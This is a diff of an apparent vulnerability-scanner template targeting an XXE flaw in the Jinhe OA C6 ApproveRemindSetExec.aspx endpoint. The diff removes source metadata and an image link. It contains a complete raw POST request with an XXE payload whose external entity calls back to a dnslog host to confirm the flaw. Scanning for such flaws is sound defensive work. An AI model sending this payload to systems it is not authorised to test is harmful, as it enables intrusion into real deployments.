@@ -3,15 +3,11 @@ info:
   name: 金和OA C6 ApproveRemindSetExec.aspx XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gqkfg67icvpoav9d'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gqkfg67icvpoav9d
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
-  - "POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nContent-Type: application/xml\n<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://wwwwwwwwwwwwwwww.t07q8o.dnslog.cn\">\n %remote;]>\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351467146-4457ae14-ed3c-4914-a51b-cc0d9340a5f7.png)"
+  - "POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nContent-Type: application/xml\n<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://wwwwwwwwwwwwwwww.t07q8o.dnslog.cn\">\n %remote;]>"
   redirects: false
   matchers:
   - status:
